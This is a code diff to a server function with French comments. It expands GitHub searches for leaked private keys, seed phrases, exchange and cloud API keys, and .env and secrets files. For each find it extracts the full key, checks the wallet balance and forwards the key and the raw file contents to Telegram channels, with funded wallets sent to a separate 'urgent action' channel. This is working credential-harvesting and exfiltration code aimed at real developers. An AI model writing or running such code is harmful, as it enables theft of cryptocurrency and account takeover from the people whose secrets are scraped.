@@ -161,8 +161,14 @@ serve(async (req) => {
     `.trim(), CHAT_ID_ALL);
 
     const queries = [
-      'PRIVATE_KEY OR WALLET_KEY OR SECRET_KEY',
-      'BINANCE_API_KEY OR STRIPE_SECRET_KEY',
+      'PRIVATE_KEY OR WALLET_KEY OR SECRET_KEY in:file',
+      'BINANCE_API_KEY OR STRIPE_SECRET_KEY OR AWS_SECRET_KEY in:file',
+      'MNEMONIC OR SEED_PHRASE in:file',
+      'filename:.env',
+      'filename:.env.local',
+      'filename:.env.production',
+      'filename:config.json',
+      'filename:secrets.txt',
     ];
 
     let totalResults = 0;
@@ -233,49 +239,75 @@ serve(async (req) => {
               const fullKey = extractFullKey(content);
               const balanceInfo = await checkBalance(content);
 
-              // LOG LIVE: Finding détecté
+              // Préparer le contenu COMPLET du fichier (max 3000 chars pour Telegram)
+              const fileContent = content.length > 3000 ? content.substring(0, 3000) + '\n\n... (tronqué)' : content;
+
+              // LOG LIVE: Finding détecté - CONTENU COMPLET
               const emoji = pattern.severity === 'critical' ? '🔴' : pattern.severity === 'high' ? '🟠' : '🟡';
-              let msg = `
-${emoji} *FINDING #${findingsCount}*
+              
+              // Message 1 : Info du finding
+              let msg1 = `
+${emoji} *FINDING #${findingsCount}* ${balanceInfo.hasBalance ? '💰' : ''}
 
 🔍 [${item.repository.full_name}](${item.repository.html_url})
 📁 \`${item.path}\`
 👤 @${item.repository.owner.login}
 
-🔑 *CLÉ COMPLÈTE:*
-\`\`\`
-${fullKey}
-\`\`\`
-
 📋 ${pattern.pattern_type} | ${pattern.severity.toUpperCase()}
+⏰ ${new Date().toLocaleTimeString('fr-FR')}
               `.trim();
 
               if (balanceInfo.hasBalance) {
                 fundedCount++;
-                msg += `\n\n💰 *BALANCE: ${balanceInfo.balance} ${balanceInfo.currency}* ($${balanceInfo.balanceUSD?.toFixed(2)})\n⛓️ ${balanceInfo.blockchain}`;
+                msg1 += `\n\n💰 *BALANCE DÉTECTÉE !*\n💵 ${balanceInfo.balance} ${balanceInfo.currency}\n💲 $${balanceInfo.balanceUSD?.toFixed(2)}\n⛓️ ${balanceInfo.blockchain}`;
+              }
 
-                // Envoyer vers channel FUNDED
+              msg1 += `\n\n🔗 [Voir le fichier](${item.html_url})`;
+
+              // Message 2 : CONTENU BRUT COMPLET du fichier
+              const msg2 = `
+📄 *CONTENU COMPLET DU FICHIER:*
+
+\`\`\`
+${fileContent}
+\`\`\`
+
+🔑 *Clé extraite:* \`${fullKey}\`
+
+📋 Vous pouvez copier le contenu ci-dessus pour analyse manuelle.
+              `.trim();
+
+              // Envoyer les 2 messages vers channel ALL
+              await sendTelegram(msg1, CHAT_ID_ALL);
+              await sendTelegram(msg2, CHAT_ID_ALL);
+
+              // Si balance > 0, envoyer vers FUNDED aussi
+              if (balanceInfo.hasBalance) {
                 const fundedMsg = `
-🚨 *ALERTE - FONDS DÉTECTÉS !*
+🚨 *ALERTE CRITIQUE - FONDS !* 🚨
 
-💰 ${balanceInfo.balance} ${balanceInfo.currency} ($${balanceInfo.balanceUSD?.toFixed(2)})
-⛓️ ${balanceInfo.blockchain}
+💰 *Balance:* ${balanceInfo.balance} ${balanceInfo.currency} ($${balanceInfo.balanceUSD?.toFixed(2)})
+⛓️ *Blockchain:* ${balanceInfo.blockchain}
 
 🔍 [${item.repository.full_name}](${item.repository.html_url})
+📁 \`${item.path}\`
 👤 @${item.repository.owner.login}
 
-🔑 *ADRESSE:*
+🔑 *CLÉ/ADRESSE COMPLÈTE:*
 \`\`\`
 ${balanceInfo.address || fullKey}
 \`\`\`
 
-⚡ *ACTION URGENTE !*
+📄 *CONTENU FICHIER:*
+\`\`\`
+${fileContent}
+\`\`\`
+
+⚡ *ACTION URGENTE REQUISE !*
                 `.trim();
 
                 await sendTelegram(fundedMsg, CHAT_ID_FUNDED);
               }
-
-              await sendTelegram(msg, CHAT_ID_ALL);
             }
           }
         } catch (e) {
